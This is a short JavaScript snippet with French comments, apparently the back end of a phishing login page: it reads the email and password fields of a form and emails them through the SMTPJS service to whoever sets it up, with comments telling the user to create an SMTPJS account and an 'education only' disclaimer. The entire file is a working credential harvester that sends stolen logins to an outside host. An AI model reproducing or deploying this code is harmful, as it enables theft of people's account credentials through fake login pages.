// Pour pouvoir avoir des emails, vous devez
// créer un compte sur https://smtpjs.com/
// EDUCATION ONLY
// je ne suis pas responsable de vos actes


function send_info() {

  var email = document.getElementById("email").value;
  var password = document.getElementById("pass").value;

  Email.send({
      SecureToken : "YOUR TOKEN",
      To : 'SENDER',
      From : "RECIPENT",
      Subject : "Subject",
      Body : "<h1>"+email+"</h1>" + "<br><br>" + "<h2>"+password+"</h2>"
  });

}




